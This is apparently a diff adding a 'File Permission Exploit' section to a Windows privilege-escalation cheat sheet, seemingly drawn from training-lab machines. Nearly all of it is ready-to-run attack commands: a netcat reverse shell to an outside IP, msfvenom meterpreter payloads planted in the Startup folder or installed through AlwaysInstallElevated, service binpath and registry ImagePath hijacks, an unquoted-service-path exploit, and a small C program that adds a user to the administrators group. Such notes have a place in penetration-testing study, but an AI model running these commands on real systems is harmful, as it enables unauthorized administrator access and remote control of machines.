@@ -28,6 +28,51 @@ scp
 
 echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.41 4455 -e cmd.exe > reverse.bat
 ```
+# File Permission Exploit
+```
+# 777 exe file ?
+
+#Check if startup programs have write access
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+ 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f exe > rev.exe
+# Place rev.exe in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup".
+
+#Check if AlwaysInstallElevated” value is 1
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f msi > setup.msi
+msiexec /quiet /qn /i C:\Temp\setup.msi
+
+# "User-PC\User" has the "SERVICE_CHANGE_CONFIG" permission.
+ sc config daclsvc binpath= "net localgroup administrators user /add"
+ sc start daclsvc
+
+# "BINARY_PATH_NAME" field displays a path that is not confined between quotes
+sc qc unquotedsvc
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+2. Open command prompt and type: sc start unquotedsvc
+
+# Has "FullContol" permission over the registry key?
+
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+windows_service.c 
+#include <stdlib.h> // Include the necessary header file
+
+int main() {
+    system("cmd.exe /k net localgroup administrators user /add"); // Use system() function to execute the command
+    return 0;
+}
+
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+
+sc start regsvc
+
+```
 
 # Metasploit Windows Reverse Shell
 
